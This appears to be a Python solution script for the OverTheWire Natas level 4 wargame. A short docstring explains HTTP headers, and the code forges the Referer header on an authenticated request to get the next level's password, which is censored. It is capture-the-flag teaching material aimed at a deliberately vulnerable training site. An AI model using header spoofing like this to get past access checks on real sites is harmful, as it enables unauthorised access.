'''
For this challenge you have to know how the HTTP works.
The HTTP works with some headers. One of them are the Referer.
You can manipulate the headers of each request even in your browser.
You can find more information here: https://en.wikipedia.org/wiki/List_of_HTTP_header_fields
'''
import requests
import re

username = "natas4"
password = "<censored>"
url = "http://%s.natas.labs.overthewire.org/"  % username

response = requests.get(url, auth=((username,password)))
print(response.text)
print("="*50)

# HTTP headers manipulation
# I am changing the REFERER to be from the next level.
headers = { "Referer" : "http://natas5.natas.labs.overthewire.org/" }

# I am passing the new "headers" inside my get request and I am getting the password for the next level.
response = requests.get(url, auth=((username,password)), headers=headers)
pageContent = response.text
code = re.findall("The password for natas\d is (.*)", pageContent)[0]
print("\nThe password for the next level is: " + code)
